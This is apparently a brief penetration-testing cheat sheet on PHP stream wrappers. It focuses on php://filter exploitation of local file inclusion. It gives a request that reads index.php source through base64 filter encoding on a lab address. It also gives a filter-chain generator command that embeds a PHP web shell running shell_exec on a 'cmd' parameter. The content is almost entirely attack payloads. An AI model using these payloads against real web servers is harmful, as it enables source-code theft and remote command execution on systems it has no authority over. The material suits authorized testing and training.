tags:
____
- php://filter
- zip://
- data://
- php://input
- expect://
____
### PHP://FILTER

```bash
http://172.17.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

```bash
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```
